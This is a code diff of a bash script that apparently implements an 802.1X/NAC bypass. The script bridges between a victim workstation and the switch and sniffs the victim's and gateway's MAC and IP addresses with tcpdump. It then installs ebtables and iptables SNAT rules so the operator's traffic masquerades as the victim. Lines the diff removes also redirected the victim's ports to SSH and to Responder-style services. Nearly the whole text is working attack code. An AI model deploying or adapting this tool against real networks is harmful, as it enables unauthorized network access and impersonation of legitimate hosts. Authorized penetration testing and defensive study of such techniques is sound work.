+# MAC in the dst_mac field. This catches TCP SYNs, TCP retransmits, UDP
+# DNS, ICMP, anything - whatever the workstation emits first.
+#
+# Secondary channel: ARP request from the workstation. The L2 src plus the
+# `tell <ip>` field reveal COMPMAC/COMIP; the `who-has <ip>` field reveals
+# GWIP, and a matching ARP Reply gives us GWMAC.
 #==============================================================================
 learn() {
+    # Operator-pinned fast path
+    if is_valid_mac "$COMPMAC_USER" && is_useful_victim_ip "$COMIP_USER" \
+       && is_valid_mac "$GWMAC_USER"; then
+        COMPMAC="$COMPMAC_USER"
+        COMIP="$COMIP_USER"
+        GWMAC="$GWMAC_USER"
+        GWIP="${GWIP_USER:-}"
+        ok "Using operator-pinned identity (no passive learning needed)."
+        ok "  victim   $COMPMAC / $COMIP"
+        ok "  gateway  $GWMAC / ${GWIP:-unknown}"
+        return 0
+    fi
+
+    local ip_pcap="$STATE_DIR/learn_ip.pcap"
     local arp_pcap="$STATE_DIR/learn_arp.pcap"
-    local dhcp_pcap="$STATE_DIR/learn_dhcp.pcap"
-    local syn_pcap="$STATE_DIR/learn_syn.pcap"
-    rm -f "$arp_pcap" "$dhcp_pcap" "$syn_pcap"
+    rm -f "$ip_pcap" "$arp_pcap"
 
-    log "Listening for victim/gateway traffic on $COMPINT (timeout ${LEARN_TIMEOUT}s)..."
+    log "Listening on $COMPINT for victim/gateway traffic (up to ${LEARN_TIMEOUT}s)..."
+    log "If the workstation is idle, generate any outbound traffic (a web request,"
+    log "a DNS lookup, anything) - the first unicast IP frame is enough."
 
-    # ARP capture - full frame size (-s 0) to be safe across versions.   LOW-3
-    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -nn -e -p -s 0 -c 10 \
+    # Primary: any unicast IPv4 frame egressing the workstation. Catches TCP
+    # SYN, TCP retransmits, UDP (DNS lookups, etc.), ICMP, anything. Direction
+    # is `in` on COMPINT so we know src=workstation and dst=next-hop.
+    # `not ether broadcast and not ether multicast` excludes mDNS/NBNS/SSDP
+    # noise that wouldn't give us a gateway MAC.
+    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -Q in -nn -e -s 96 -c 1 \
+        -w "$ip_pcap" 'ip and not ether broadcast and not ether multicast' >/dev/null 2>&1 &
+    local ip_pid=$!
+
+    # Secondary: ARP (up to 10 frames for request+reply coverage)
+    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -Q in -nn -e -p -s 0 -c 10 \
         -w "$arp_pcap" 'arp' >/dev/null 2>&1 &
     local arp_pid=$!
-    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -nn -e -s 0 -c 1 \
-        -w "$dhcp_pcap" 'udp src port 67 and udp dst port 68' >/dev/null 2>&1 &
-    local dhcp_pid=$!
-    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -nn -e -s 64 -c 1 \
-        -w "$syn_pcap" 'tcp[tcpflags] & tcp-syn != 0' >/dev/null 2>&1 &
-    local syn_pid=$!
 
-    local first
-    first=$(wait_any "$arp_pid" "$dhcp_pid" "$syn_pid")
-    debug "First learning channel returned: pid=$first"
-
-    if kill -0 "$arp_pid" 2>/dev/null; then
-        sleep 3
-        kill "$arp_pid" 2>/dev/null || true
-    fi
-    kill "$dhcp_pid" "$syn_pid" 2>/dev/null || true
+    wait_any "$ip_pid" "$arp_pid" >/dev/null
+    sleep 2   # give the other capture a beat to fill in detail
+    kill "$ip_pid" "$arp_pid" 2>/dev/null || true
     wait 2>/dev/null || true
 
-    # Try parsers in order of reliability; clear any partial state between.
-    COMPMAC=""; COMIP=""; GWIP=""
-    [ -z "$GWMAC_USER" ] && GWMAC=""
-    if parse_arp  "$arp_pcap";  then debug "Learned via ARP";  fi
-    if [ -z "$COMPMAC" ] && parse_dhcp "$dhcp_pcap"; then debug "Learned via DHCP"; fi
-    if [ -z "$COMPMAC" ] && parse_syn  "$syn_pcap";  then debug "Learned via SYN"; fi
+    # Seed with any operator-pinned values so the parser can fill the rest
+    COMPMAC="$COMPMAC_USER"
+    COMIP="$COMIP_USER"
+    GWMAC="$GWMAC_USER"
+    GWIP="$GWIP_USER"
 
-    # CRIT-5: refuse to proceed if we don't have everything we need.
-    if ! is_valid_mac "$COMPMAC" || ! is_valid_ip "$COMIP"; then
-        err "Could not learn victim MAC/IP in ${LEARN_TIMEOUT}s."
-        err "Workstation may be idle. Try a longer timeout: -t 120"
-        return 1
+    parse_ip  "$ip_pcap"  && debug "Learned via IP frame"
+    parse_arp "$arp_pcap" && debug "Learned via ARP"
+
+    # Validate
+    local missing=()
+    is_valid_mac "$COMPMAC"      || missing+=("workstation MAC")
+    is_useful_victim_ip "$COMIP" || missing+=("workstation IP")
+    is_valid_mac "$GWMAC"        || missing+=("gateway MAC")
+
+    if [ ${#missing[@]} -eq 0 ]; then
+        ok "Learned identity:"
+        ok "  victim   $COMPMAC / $COMIP"
+        ok "  gateway  $GWMAC / ${GWIP:-unknown}"
+        return 0
     fi
-    if ! is_valid_mac "$GWMAC" || ! is_valid_ip "$GWIP"; then
-        err "Learned victim ($COMPMAC / $COMIP) but not gateway info."
-        err "Re-run with -g <gateway_mac> to pin it manually, or wait for the workstation to ARP for its gateway."
-        return 1
-    fi
-    return 0
+
+    learn_failure_report "${missing[@]}"
+    return 1
 }
 
+learn_failure_report() {
+    local missing=("$@")
+    err "Did not learn a complete identity in ${LEARN_TIMEOUT}s."
+    err "What we have:"
+    err "  workstation mac : $( is_valid_mac "$COMPMAC"      && echo "$COMPMAC [OK]" || echo "${COMPMAC:-?} [MISSING]")"
+    err "  workstation ip  : $( is_useful_victim_ip "$COMIP" && echo "$COMIP [OK]"   || echo "${COMIP:-?} [MISSING]")"
+    err "  gateway mac     : $( is_valid_mac "$GWMAC"        && echo "$GWMAC [OK]"   || echo "${GWMAC:-?} [MISSING]")"
+    err "  gateway ip      : $( is_valid_ip "$GWIP"          && echo "$GWIP [info]"  || echo "${GWIP:-?} [info]")"
+
+    # Common-case diagnostics
+    if [[ "$COMIP" =~ ^169\.254\. ]]; then
+        err ""
+        err "Workstation IP is APIPA (169.254.x.x). It has no real DHCP lease."
+        err "Most likely 802.1X is unauthenticated. Wait 60-120s for the supplicant"
+        err "to re-auth and renew DHCP, then re-run the script."
+    elif [ "$COMIP" = "0.0.0.0" ]; then
+        err ""
+        err "Captured an ARP Probe (sender=0.0.0.0). Workstation has not finished"
+        err "configuring its IP. Wait and retry."
+    elif is_valid_ip "$GWIP" && ! is_valid_mac "$GWMAC"; then
+        err ""
+        err "We know the gateway IP ($GWIP) but never saw its MAC. Likely cause:"
+        err "the switch-side link is down or the gateway is silent. On the"
+        err "WORKSTATION itself run:"
+        err "    arp -a | findstr $GWIP                  (Windows)"
+        err "    ip neigh | grep $GWIP                    (Linux/Mac)"
+        err "Then re-run with the gateway MAC pinned via -g."
+    fi
+
+    err ""
+    err "To pin missing values manually:"
+    err "  -V <workstation_mac>  -W <workstation_ip>"
+    err "  -g <gateway_mac>      -G <gateway_ip>"
+}
+
+# wait_any: returns when any of the listed PIDs has exited.
 wait_any() {
     local pids=("$@")
     while :; do
         local p
         for p in "${pids[@]}"; do
-            if ! kill -0 "$p" 2>/dev/null; then echo "$p"; return 0; fi
+            if ! kill -0 "$p" 2>/dev/null; then
+                echo "$p"; return 0
+            fi
         done
         sleep 0.2
     done
 }
 
-# parse_arp: extract victim mac/ip from a Request and gateway mac/ip from the
-# matching Reply. Token-anchored so it survives tcpdump version drift.
-# Drops the .1/.254 fallback heuristic (MED-3).
+# parse_ip: extract identity from any unicast IPv4 frame leaving the
+# workstation. Because direction is `in` on COMPINT and we excluded
+# broadcast/multicast at capture time:
+#     src_mac = workstation MAC
+#     dst_mac = next-hop MAC (gateway for off-subnet destinations)
+#     src_ip  = workstation IP
+# Works equally well for TCP SYN, TCP retransmits, UDP DNS, UDP NetBIOS
+# unicast, ICMP, etc. - whichever the workstation happens to emit first.
+parse_ip() {
+    local pcap=$1
+    [ -s "$pcap" ] || return 1
+    [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1
+
+    local line
+    line=$("$CMD_TCPDUMP" -nn -e -r "$pcap" 2>/dev/null | head -1)
+    [ -z "$line" ] && return 1
+    debug "IP frame: $line"
+
+    # `tcpdump -nn -e` format for IPv4:
+    #   HH:MM:SS.NNN src_mac > dst_mac, ethertype IPv4 (0x0800), length L:
+    #   src_ip(.port)? > dst_ip(.port)?: <proto-specific>
+    # Fields 2/4/10 stay the same across TCP/UDP/ICMP because IPv4 wrapping
+    # is identical; only the trailing protocol decode differs.
+    local s_mac d_mac s_ip
+    s_mac=$(awk '{print $2}' <<<"$line")
+    d_mac=$(awk '{gsub(/,$/,"",$4); print $4}' <<<"$line")
+    s_ip=$(awk '{print $10}' <<<"$line" | awk -F. '{print $1"."$2"."$3"."$4}')
+
+    is_valid_mac "$s_mac" || return 1
+    is_valid_mac "$d_mac" || return 1
+    is_valid_ip  "$s_ip"  || return 1
+
+    [ -z "$COMPMAC" ] && COMPMAC="$s_mac"
+    [ -z "$COMIP"   ] && COMIP="$s_ip"
+    [ -z "$GWMAC"   ] && GWMAC="$d_mac"
+    return 0
+}
+
+# parse_arp: extract workstation identity from a Request and the gateway's
+# MAC from the matching Reply. RFC-5227 ARP Probes (tell 0.0.0.0) are
+# explicitly skipped - they don't carry workstation IP.
 parse_arp() {
     local pcap=$1
     [ -s "$pcap" ] || return 1
     [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1
 
     local lines vmac="" vip="" gmac="" gip="" target_ip=""
-    lines=$("$CMD_TCPDUMP" -nn -e -r "$pcap" 2>/dev/null) || return 1
+    lines=$("$CMD_TCPDUMP" -nn -e -r "$pcap" 2>/dev/null)
     [ -z "$lines" ] && return 1
 
-    debug "ARP capture:"
+    debug "ARP frames:"
     while IFS= read -r l; do debug "  $l"; done <<<"$lines"
 
+    # Pass 1: find a Request with a real sender IP
     while IFS= read -r line; do
         if [[ "$line" =~ Request[[:space:]]who-has[[:space:]]([0-9.]+) ]]; then
             target_ip="${BASH_REMATCH[1]}"
         fi
         if [[ "$line" =~ tell[[:space:]]([0-9.]+) ]]; then
-            vip="${BASH_REMATCH[1]}"
+            local cand="${BASH_REMATCH[1]}"
+            if [ "$cand" = "0.0.0.0" ]; then
+                debug "  (skip ARP Probe: $line)"
+                continue
+            fi
+            vip="$cand"
             vmac=$(awk '{print $2}' <<<"$line")
         fi
         [ -n "$vmac" ] && [ -n "$vip" ] && [ -n "$target_ip" ] && break
     done <<<"$lines"
 
+    # Pass 2: matching Reply for target_ip
     if [ -n "$target_ip" ]; then
         local esc=${target_ip//./\\.}
         while IFS= read -r line; do
@@ -606,211 +645,140 @@ parse_arp() {
         done <<<"$lines"
     fi
 
-    is_valid_mac "$vmac" || return 1
-    is_valid_ip  "$vip"  || return 1
-    COMPMAC="$vmac"; COMIP="$vip"
-    if is_valid_mac "$gmac" && is_valid_ip "$gip"; then
-        GWMAC="${GWMAC_USER:-$gmac}"
-        GWIP="$gip"
-    fi
-    [ -n "$GWMAC_USER" ] && GWMAC="$GWMAC_USER"
-    return 0
-}
+    # Merge with whatever's already set (SYN parser may have filled some)
+    [ -z "$COMPMAC" ] && is_valid_mac "$vmac" && COMPMAC="$vmac"
+    [ -z "$COMIP"   ] && is_valid_ip  "$vip"  && COMIP="$vip"
+    [ -z "$GWMAC"   ] && is_valid_mac "$gmac" && GWMAC="$gmac"
+    [ -z "$GWIP"    ] && is_valid_ip  "$gip"  && GWIP="$gip"
+    # Even without a Reply, expose the target IP as the gateway IP candidate
+    [ -z "$GWIP"    ] && is_valid_ip  "$target_ip" && GWIP="$target_ip"
 
-# parse_dhcp: tolerant of multiple tcpdump output variants               HIGH-3
-parse_dhcp() {
-    local pcap=$1
-    [ -s "$pcap" ] || return 1
-    [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1
-
-    local out
-    out=$("$CMD_TCPDUMP" -nn -e -v -r "$pcap" 2>/dev/null) || return 1
-    debug "DHCP capture:"
-    while IFS= read -r l; do debug "  $l"; done <<<"$out"
-
-    local vmac vip gmac gip
-    # chaddr: tcpdump prints "Client-Ethernet-Address aa:..." on most versions,
-    # "chaddr aa:.." or just inline on others. Match either, then extract MAC.
-    vmac=$(grep -ioE '(client-ethernet-address|chaddr)[^0-9a-f]+([0-9a-f]{2}:){5}[0-9a-f]{2}' <<<"$out" \
-           | grep -oiE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
-
-    # Your-IP from BOOTP body (Offer/Ack carry it)
-    vip=$(grep -oE 'Your-IP[[:space:]]+[0-9.]+'   <<<"$out" | awk '{print $2}' | head -1)
-    [ -z "$vip" ] && vip=$(grep -oE 'Client-IP[[:space:]]+[0-9.]+' <<<"$out" | awk '{print $2}' | head -1)
-
-    # Server-Identifier (Option 54). Variants: "Server-Id Option 54", "Server-ID",
-    # "Server-Identifier", followed by an IP.
-    gip=$(grep -ioE '(server-id|server-identifier)[^0-9]*([0-9]{1,3}\.){3}[0-9]{1,3}' <<<"$out" \
-          | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | tail -1)
-    [ -z "$gip" ] && gip=$(grep -oE 'Server-IP[[:space:]]+[0-9.]+' <<<"$out" | awk '{print $2}' | head -1)
-
-    # L2 src MAC of the (first) reply frame is the gateway/relay
-    gmac=$(awk 'NR==1 && $2 ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ {print $2}' <<<"$out")
-
-    is_valid_mac "$vmac" || return 1
-    is_valid_ip  "$vip"  || return 1
-    COMPMAC="$vmac"; COMIP="$vip"
-    if is_valid_mac "$gmac" && is_valid_ip "$gip"; then
-        GWMAC="${GWMAC_USER:-$gmac}"
-        GWIP="$gip"
-    fi
-    [ -n "$GWMAC_USER" ] && GWMAC="$GWMAC_USER"
-    return 0
-}
-
-# parse_syn: lowest fidelity; cannot reliably tell direction from one packet.
-parse_syn() {
-    local pcap=$1
-    [ -s "$pcap" ] || return 1
-    [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1
-
-    local line
-    line=$("$CMD_TCPDUMP" -nn -e -r "$pcap" 2>/dev/null | head -1)
-    [ -z "$line" ] && return 1
-
-    local s_mac d_mac s_ip d_ip
-    s_mac=$(awk '{print $2}' <<<"$line")
-    d_mac=$(awk '{gsub(/,$/,"",$4); print $4}' <<<"$line")
-    s_ip=$(awk '{print $10}' <<<"$line" | awk -F. '{print $1"."$2"."$3"."$4}')
-    d_ip=$(awk '{print $12}' <<<"$line" | awk -F. '{print $1"."$2"."$3"."$4}')
-
-    if ! is_valid_mac "$d_mac"; then
-        COMPMAC="$s_mac"; COMIP="$s_ip"
-    else
-        COMPMAC="$d_mac"; COMIP="$d_ip"
-        is_valid_mac "$s_mac" && is_valid_ip "$s_ip" && {
-            GWMAC="${GWMAC_USER:-$s_mac}"; GWIP="$s_ip"
-        }
-    fi
-    [ -n "$GWMAC_USER" ] && GWMAC="$GWMAC_USER"
-
-    is_valid_mac "$COMPMAC" && is_valid_ip "$COMIP" || return 1
     return 0
 }
 
 #==============================================================================
 # Masquerade rules
+#
+# $SWMAC here = the BRIDGE's MAC (auto-inherited from SWINT when SWINT was
+# enslaved first). Locally-generated frames egress br0 with src_mac=SWMAC,
+# which is what the three ebtables rules below key on.
+#
+# L2 (ebtables, NAC_BYPASS chain off POSTROUTING):
+#   1. -s SWMAC -o SWINT   -j snat --to-src COMPMAC   (toward switch)
+#   2. -s SWMAC -o BRINT   -j snat --to-src COMPMAC   (sanity)
+#   3. -s SWMAC -o COMPINT -j snat --to-src GWMAC     (toward workstation)
+#
+# Workstation traffic is unaffected because its src_mac is COMPMAC, not SWMAC.
+# Switch reply traffic is unaffected because its src_mac is GWMAC, not SWMAC.
+#
+# L3 (iptables, NAC_BYPASS chain off POSTROUTING):
+#   1. -o BRINT -s BRIP -p tcp  -j SNAT --to COMIP:RANGE  --random-fully
+#   2. -o BRINT -s BRIP -p udp  -j SNAT --to COMIP:RANGE  --random-fully
+#   3. -o BRINT -s BRIP -p icmp -j SNAT --to COMIP
+#
+# Plus:
+#   - Static neighbor entry pinning BRGW=169.254.66.1 -> GWMAC on BRINT
+#     (so the kernel never has to ARP for the fictional bridge gateway)
+#   - Default route: default via BRGW dev BRINT metric 0
+#   - The bridge gets address BRIP/$BRMASK so it can source traffic
 #==============================================================================
 install_masquerade() {
-    log "Installing masquerade rules (victim=$COMPMAC/$COMIP gw=$GWMAC/$GWIP)..."
+    log "Installing masquerade rules..."
+    log "  victim   $COMPMAC / $COMIP"
+    log "  gateway  $GWMAC / ${GWIP:-unknown}"
 
     # Address the bridge
-    if ! "$CMD_IP" addr add "$BRIP/$BRMASK_BITS" dev "$BRINT" 2>/dev/null; then
-        # OK if already present - check
-        "$CMD_IP" -4 addr show dev "$BRINT" | grep -q "$BRIP" \
-            || die "Failed to assign $BRIP to $BRINT."
+    "$CMD_IP" addr add "$BRIP/$BRMASK" dev "$BRINT" 2>/dev/null \
+        || "$CMD_IP" -4 addr show dev "$BRINT" | grep -q "$BRIP" \
+        || die "Failed to assign $BRIP to $BRINT."
+
+    # ----- Named chains (so cleanup never flushes operator's rules) ----------
+    # iptables nat
+    "$CMD_IPTABLES" -t nat -N "$NAC_NAT_CHAIN" 2>/dev/null \
+        || "$CMD_IPTABLES" -t nat -F "$NAC_NAT_CHAIN"
+    "$CMD_IPTABLES" -t nat -C POSTROUTING -j "$NAC_NAT_CHAIN" 2>/dev/null \
+        || "$CMD_IPTABLES" -t nat -A POSTROUTING -j "$NAC_NAT_CHAIN"
+
+    # ebtables nat
+    "$CMD_EBTABLES" -t nat -N "$NAC_EBT_CHAIN" 2>/dev/null \
+        || "$CMD_EBTABLES" -t nat -F "$NAC_EBT_CHAIN"
+    if ! "$CMD_EBTABLES" -t nat -L POSTROUTING 2>/dev/null | grep -q -- "-j $NAC_EBT_CHAIN"; then
+        "$CMD_EBTABLES" -t nat -A POSTROUTING -j "$NAC_EBT_CHAIN"
     fi
+    state_set "chains_installed" "1"
 
-    # Rebuild named chains from scratch every time install_masquerade runs
-    # so re-arming after a link flap can't accumulate duplicate rules.   MED-7
-    nac_chains_destroy
-    nac_chains_create
+    # ----- L2 SNAT (3 rules) -------------------------------------------------
+    "$CMD_EBTABLES" -t nat -A "$NAC_EBT_CHAIN" -s "$SWMAC" -o "$SWINT"   -j snat --to-src "$COMPMAC"
+    "$CMD_EBTABLES" -t nat -A "$NAC_EBT_CHAIN" -s "$SWMAC" -o "$BRINT"   -j snat --to-src "$COMPMAC"
+    "$CMD_EBTABLES" -t nat -A "$NAC_EBT_CHAIN" -s "$SWMAC" -o "$COMPINT" -j snat --to-src "$GWMAC"
 
-    # L2: rewrite src MAC of frames egressing the switch-side NIC to the
-    # victim's MAC. (The redundant `-o $BRINT` rule from v3.0 is removed.) MED-6
-    "$CMD_EBTABLES" -t nat -A "$NAC_EBT_NAT" -s "$SWMAC" -o "$SWINT" -j snat --to-src "$COMPMAC"
-
-    # Static neighbour entry for the (fictional) BRGW so the kernel never
-    # needs to ARP for it. Uses ip(8), no dependency on net-tools/arp.   CRIT-1
+    # ----- Static neighbor for the fictional bridge gateway -----------------
     "$CMD_IP" neigh replace "$BRGW" lladdr "$GWMAC" dev "$BRINT" nud permanent \
-        || die "Failed to install static neighbour entry $BRGW -> $GWMAC."
+        || die "Failed to install static neighbor $BRGW -> $GWMAC."
     state_set "neigh_static" "$BRGW"
 
-    # Default route via the bridge - ADDITIVE so we don't kill the operator's
-    # mgmt default route. Existing defaults were snapshotted in host_lockdown
-    # for restoration on cleanup.                                       CRIT-2
-    if ! "$CMD_IP" route add default via "$BRGW" dev "$BRINT" metric "$ROUTE_METRIC" 2>/dev/null; then
-        # Likely a metric collision with an existing default.
-        warn "Could not add default via $BRINT at metric $ROUTE_METRIC (likely collision)."
-        warn "Tools may egress wrong NIC. Pin tools to $BRINT explicitly, or rerun with -m <free_metric>."
+    # ----- Default route (additive, never destroys operator's mgmt route) ----
+    if "$CMD_IP" route add default via "$BRGW" dev "$BRINT" metric 0 2>/dev/null; then
+        state_set "route_default_added" "1"
     else
-        state_set "route_default_added" "via $BRGW dev $BRINT metric $ROUTE_METRIC"
+        warn "Could not add default route via $BRINT at metric 0 (collision)."
+        warn "Tools may egress the wrong NIC. Pin them with -e/-S flags or use -m."
     fi
 
-    # L3 SNAT in our private chain. --random-fully reduces port collisions
-    # with the workstation's own outbound flows.                       HIGH-4
-    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p tcp  -j SNAT --to "$COMIP:$SNAT_RANGE" --random-fully 2>/dev/null \
-        || "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p tcp  -j SNAT --to "$COMIP:$SNAT_RANGE"
-    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p udp  -j SNAT --to "$COMIP:$SNAT_RANGE" --random-fully 2>/dev/null \
-        || "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p udp  -j SNAT --to "$COMIP:$SNAT_RANGE"
-    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p icmp -j SNAT --to "$COMIP"
+    # ----- L3 SNAT (3 rules) -------------------------------------------------
+    # `--random-fully` (kernel >= 3.13) shuffles the source port allocation
+    # so our SNAT'd flows are less likely to collide with whatever the
+    # workstation happens to be using from its own ephemeral range. We try
+    # it first and fall back to the plain SNAT for ancient iptables.
+    if ! "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p tcp \
+            -j SNAT --to "$COMIP:$SNAT_RANGE" --random-fully 2>/dev/null; then
+        "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p tcp \
+            -j SNAT --to "$COMIP:$SNAT_RANGE"
+    fi
+    if ! "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p udp \
+            -j SNAT --to "$COMIP:$SNAT_RANGE" --random-fully 2>/dev/null; then
+        "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p udp \
+            -j SNAT --to "$COMIP:$SNAT_RANGE"
+    fi
+    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_CHAIN" -o "$BRINT" -s "$BRIP" -p icmp \
+        -j SNAT --to "$COMIP"
 
-    # Optional service redirection
-    [ "$OPT_SSH" -eq 1 ]       && install_ssh_redirect
-    [ "$OPT_RESPONDER" -eq 1 ] && install_responder_redirect
-
-    # Now that NAT is in place, lift the egress lock
+    # Lift the egress lock now that NAT is in place
     remove_egress_lock
 
     CONN_ACTIVE=1
     state_set "masquerade_active" "1"
-
-    # Warn about competing default routes
-    local others
-    others=$("$CMD_IP" -4 route show default 2>/dev/null | grep -v "dev $BRINT" || true)
-    if [ -n "$others" ]; then
-        warn "Other default routes still present (may steal egress):"
-        while IFS= read -r l; do warn "    $l"; done <<<"$others"
-        warn "Pin tools to $BRINT (e.g. nmap -e $BRINT -S $BRIP) if egress is wrong."
-    fi
-
-    ok "Masquerade active. Outbound traffic from this host appears as $COMIP/$COMPMAC."
+    ok "Masquerade active. Outbound traffic from this host now appears as $COMIP / $COMPMAC."
 }
 
 remove_masquerade() {
     debug "Removing masquerade rules..."
 
-    nac_chains_destroy
+    # ebtables: unhook + flush + delete our chain
+    "$CMD_EBTABLES" -t nat -D POSTROUTING -j "$NAC_EBT_CHAIN" 2>/dev/null || true
+    "$CMD_EBTABLES" -t nat -F "$NAC_EBT_CHAIN" 2>/dev/null || true
+    "$CMD_EBTABLES" -t nat -X "$NAC_EBT_CHAIN" 2>/dev/null || true
 
+    # iptables: unhook + flush + delete our chain
+    "$CMD_IPTABLES" -t nat -D POSTROUTING -j "$NAC_NAT_CHAIN" 2>/dev/null || true
+    "$CMD_IPTABLES" -t nat -F "$NAC_NAT_CHAIN" 2>/dev/null || true
+    "$CMD_IPTABLES" -t nat -X "$NAC_NAT_CHAIN" 2>/dev/null || true
+
+    # Default route + neigh + bridge IP
+    if [ "$(state_get route_default_added)" = "1" ]; then
+        "$CMD_IP" route del default via "$BRGW" dev "$BRINT" 2>/dev/null || true
+    fi
     if [ -n "$(state_get neigh_static)" ]; then
         "$CMD_IP" neigh del "$BRGW" dev "$BRINT" 2>/dev/null || true
-        rm -f "$STATE_DIR/neigh_static"
     fi
+    "$CMD_IP" addr del "$BRIP/$BRMASK" dev "$BRINT" 2>/dev/null || true
 
-    if [ -n "$(state_get route_default_added)" ]; then
-        "$CMD_IP" route del default via "$BRGW" dev "$BRINT" 2>/dev/null || true
-        rm -f "$STATE_DIR/route_default_added"
-    fi
-
-    "$CMD_IP" addr del "$BRIP/$BRMASK_BITS" dev "$BRINT" 2>/dev/null || true
-
-    rm -f "$STATE_DIR/masquerade_active"
+    rm -f "$STATE_DIR/route_default_added" "$STATE_DIR/neigh_static" \
+          "$STATE_DIR/masquerade_active" "$STATE_DIR/chains_installed"
 }
 
 #==============================================================================
-# Service redirection (rules go into the named chains)
-#==============================================================================
-install_ssh_redirect() {
-    log "Installing SSH redirect ($COMIP:$DPORT_SSH -> $BRIP:$PORT_SSH)..."
-    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_IN" -i "$BRINT" -d "$COMIP" -p tcp \
-        --dport "$DPORT_SSH" -j DNAT --to "$BRIP:$PORT_SSH"
-
-    if systemctl list-unit-files ssh.service 2>/dev/null | grep -q ssh.service; then
-        if ! systemctl is-active --quiet ssh.service; then
-            systemctl start ssh.service && state_set "ssh_started" "1"
-        fi
-    elif systemctl list-unit-files sshd.service 2>/dev/null | grep -q sshd.service; then
-        if ! systemctl is-active --quiet sshd.service; then
-            systemctl start sshd.service && state_set "sshd_started" "1"
-        fi
-    fi
-}
-
-install_responder_redirect() {
-    log "Installing Responder redirects (victim ports -> $BRIP)..."
-    local p
-    for p in "${RESPONDER_TCP_PORTS[@]}"; do
-        "$CMD_IPTABLES" -t nat -A "$NAC_NAT_IN" -i "$BRINT" -d "$COMIP" -p tcp \
-            --dport "$p" -j DNAT --to "$BRIP:$p"
-    done
-    for p in "${RESPONDER_UDP_PORTS[@]}"; do
-        "$CMD_IPTABLES" -t nat -A "$NAC_NAT_IN" -i "$BRINT" -d "$COMIP" -p udp \
-            --dport "$p" -j DNAT --to "$BRIP:$p"
-    done
-}
-
-#==============================================================================
-# Cleanup - reverses everything that left a marker in $STATE_DIR.
+# Cleanup
 #==============================================================================
 cleanup_on_error() {
     if [ "$INITIALISED" -eq 1 ] || [ "$CONN_ACTIVE" -eq 1 ] \
@@ -827,10 +795,11 @@ full_reset() {
     remove_masquerade
     remove_egress_lock
 
-    # Take the bridge down and detach members
+    # Take bridge down, detach members, delete bridge
     if has_iface "$BRINT"; then
         "$CMD_IP" link set "$BRINT" down 2>/dev/null || true
         for iface in "$SWINT" "$COMPINT"; do
+            [ -z "$iface" ] && continue
             if [ "$(iface_master "$iface" 2>/dev/null)" = "$BRINT" ]; then
                 "$CMD_IP" link set "$iface" nomaster 2>/dev/null || true
             fi
@@ -838,55 +807,44 @@ full_reset() {
         "$CMD_IP" link del "$BRINT" 2>/dev/null || true
     fi
 
-    # Bring the physical NICs back to a usable state                    CRIT-6
+    # Restore physical NIC state
     for iface in "$SWINT" "$COMPINT"; do
+        [ -z "$iface" ] && continue
         if has_iface "$iface"; then
             "$CMD_IP" link set "$iface" promisc off 2>/dev/null || true
-            "$CMD_IP" link set "$iface" multicast on 2>/dev/null || true
-            "$CMD_IP" link set "$iface" up 2>/dev/null || true
+            "$CMD_IP" link set "$iface" up          2>/dev/null || true
         fi
     done
 
-    # Restore sysctls we changed
+    # Restore sysctls
     [ -n "$(state_get ip_forward)" ]        && write_sysctl net.ipv4.ip_forward                "$(state_get ip_forward)"        || true
     [ -n "$(state_get ipv6_disable_all)" ]  && write_sysctl net.ipv6.conf.all.disable_ipv6     "$(state_get ipv6_disable_all)"  || true
     [ -n "$(state_get br_nf_call_ipt)" ]    && write_sysctl net.bridge.bridge-nf-call-iptables "$(state_get br_nf_call_ipt)"    || true
     [ -n "$(state_get icmp_ignore_bcast)" ] && write_sysctl net.ipv4.icmp_echo_ignore_broadcasts "$(state_get icmp_ignore_bcast)" || true
 
-    # Restore resolv.conf
-    if [ -f "$STATE_DIR/resolv.conf.bak" ]; then
-        cp -a "$STATE_DIR/resolv.conf.bak" /etc/resolv.conf
-    fi
-
-    # Restore default routes that existed pre-run                       CRIT-2
+    # Restore previously-existing default routes
     if [ -s "$STATE_DIR/default_routes.bak" ]; then
         while IFS= read -r r; do
             [ -z "$r" ] && continue
-            # Only restore routes NOT going through our bridge (which is gone)
-            [[ "$r" == *"dev $BRINT"* ]] && continue
-            # ip route show output is parsable directly by ip route add
+            [[ "$r" == *"dev $BRINT"* ]] && continue   # ours, already deleted
             "$CMD_IP" route add $r 2>/dev/null || true
         done < "$STATE_DIR/default_routes.bak"
     fi
 
-    # Stop services we started; restart services we stopped
-    [ "$(state_get ssh_started)"  = "1" ] && systemctl stop ssh.service  2>/dev/null || true
-    [ "$(state_get sshd_started)" = "1" ] && systemctl stop sshd.service 2>/dev/null || true
-
+    # Restart stopped services
     if [ -f "$STATE_DIR/ntp_stopped" ]; then
         while IFS= read -r svc; do
             [ -n "$svc" ] && systemctl start "$svc" 2>/dev/null
         done < "$STATE_DIR/ntp_stopped"
     fi
     timedatectl set-ntp true 2>/dev/null || true
-
